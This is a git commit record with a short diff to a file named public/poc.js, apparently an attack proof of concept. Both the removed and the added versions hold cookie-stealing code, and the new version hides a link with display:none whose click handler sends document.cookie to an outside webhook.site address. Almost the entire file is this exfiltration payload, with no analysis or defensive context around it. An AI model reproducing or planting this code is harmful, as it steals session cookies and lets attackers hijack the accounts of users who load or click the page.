804845cca85c68aa58688eae3a0591ea469f40eb
SanghyeonYeah <jeff090413@gmail.com>
2026-03-30 13:21:05 +0900

    Update poc.js

--- public/poc.js
+++ public/poc.js
@@ -1,1 +1,6 @@
-<a href="#" onclick="window.location.href='https://webhook.site/f7a6cfea-5f3f-4ae3-a158-77f0cb809474?cookie=' + encodeURIComponent(document.cookie); return false;">Click</a>
+<a id="exfil" href="#" style="display:none;">Exfil</a>
+<script>
+document.getElementById('exfil').onclick = function() {
+    window.location.href = 'https://webhook.site/f7a6cfea-5f3f-4ae3-a158-77f0cb809474?cookie=' + encodeURIComponent(document.cookie);
+};
+</script>
